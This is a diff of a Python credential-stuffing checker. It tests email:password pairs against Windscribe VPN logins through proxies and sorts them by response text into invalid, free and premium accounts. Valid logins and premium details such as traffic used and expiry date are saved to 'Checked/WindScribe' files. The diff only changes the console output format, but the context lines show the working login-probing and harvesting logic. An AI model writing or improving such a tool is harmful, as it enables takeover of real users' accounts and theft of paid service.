@@ -75,12 +75,13 @@ def check(email, password, proxy):
                                  proxies=proxies, timeout=5)
         account_count += 1
         if response.status_code == 403 or "Could not log in with provided credentials" in response.text:
-            print(f'Account {email}:{password} is invalid.')
+            #print(f'Account {email}:{password} is invalid.')
+            print(f"{reset}[ {cyan}{reset} ] {gray}({red}-{gray}) {pretty} Account {email}:{password} is invalid. {gray}|{pink}{gray}:{pink}{password}{gray}")
         elif "session_auth_hash" not in response.text:
-            print(f"{reset}[ {cyan}{reset} ] {gray}({red}-{gray}) {pretty} Error checking account {email}:{password}. {gray}|{pink} {email}{gray}:{pink}{password}{gray}")
+            print(f"{reset}[ {cyan}{reset} ] {gray}({red}-{gray}) {pretty} Error checking account {email}:{password}. {gray}|{pink}{gray}:{pink}{password}{gray}")
             #print(f'Error checking account {email}:{password}.')
         elif "is_premium\": 0" in response.text:
-            print(f"{reset}[ {cyan}{reset} ] {gray}({lightblue}~{gray}) {pretty}Account {email}:{password} is a valid custom account.{gray}|{pink} {email}{gray}:{pink}{password}{gray}")
+            print(f"{reset}[ {cyan}{reset} ] {gray}({lightblue}~{gray}) {pretty}Account {email}:{password} is a valid custom account.{gray}|{pink} {gray}:{pink}{password}{gray}")
             #print(f'Account {email}:{password} is a valid custom account.')
             with open('Checked/WindScribe/free.txt', 'a') as f:
                 f.write(f'{email}:{password}\n')
@@ -90,12 +91,12 @@ def check(email, password, proxy):
             username = djson["username"]
             used = f'{(((djson["traffic_used"] / 1024) / 1024) / 1024)}GB/{(((djson["traffic_max"] / 1024) / 1024) / 1024)}GB'
             expire = djson["premium_expiry_date"]
-            print(f"{reset}[ {cyan}{reset} ] {gray}({green}+{gray}) {pretty}f'Account {email}:{password} is a valid premium account with details: Email: {email} | Username: {username} | Used: {used} | Expire: {expire}'{gray}|{pink} {email}{gray}:{pink}{password}{gray} | {green}Premium")
+            print(f"{reset}[ {cyan}{reset} ] {gray}({green}+{gray}) {pretty}f'This account is a valid premium account with details: Email: {email} | Username: {username} | Used: {used} | Expire: {expire}'{gray}|{pink} {email}{gray}:{pink}{password}{gray} | {green}Premium")
             #print(
              #   f'Account {email}:{password} is a valid premium account with details: Email: {email} | Username: {username} | Used: {used} | Expire: {expire}')
             with open('Checked/WindScribe/premium.txt', 'a') as f:
                 f.write(
-                    f'Account {email}:{password} is a valid premium account with details: Email: {email} | Username: {username} | Used: {used} | Expire: {expire}\n')
+                    f'This account  is a valid premium account with details: Email: {email} | Username: {username} | Used: {used} | Expire: {expire}\n')
     except requests.exceptions.RequestException as e:
         print(f"Error with proxy {proxy}: {e}")
 
